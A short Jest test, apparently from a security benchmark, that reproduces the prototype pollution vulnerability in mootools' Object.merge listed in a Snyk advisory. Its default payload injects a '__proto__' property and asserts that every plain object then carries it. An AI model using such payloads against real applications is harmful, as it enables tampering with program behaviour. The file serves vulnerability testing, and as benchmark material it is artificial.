//https://security.snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536
test("prototype pollution in mootools", () => {
  require("mootools");

  expect({}.polluted).toBe(undefined);

  Object.merge({}, JSON.parse(process.env.SECBENCH_PAYLOAD || '{"__proto__": {"polluted": "yes"}}'));

  expect({}.polluted).toBe("yes");
});
